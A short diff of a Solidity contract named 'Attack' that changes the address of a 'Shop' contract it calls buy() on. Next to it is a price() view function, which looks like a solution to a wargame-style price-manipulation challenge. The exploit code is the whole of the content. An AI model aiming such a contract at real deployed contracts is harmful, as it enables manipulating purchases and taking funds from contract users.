@@ -26,7 +26,7 @@ contract Attack {
   
   Shop shop;
    function att()public{
-     shop=Shop(0xB5f05481DAdb5044C0cCCEc95dABB07577e3665C);
+     shop=Shop(0x25Ec6665f67Cb3137CecEAeF3e8cCAE6A21317E6);
      shop.buy();
    }
    function price()external view returns (uint){
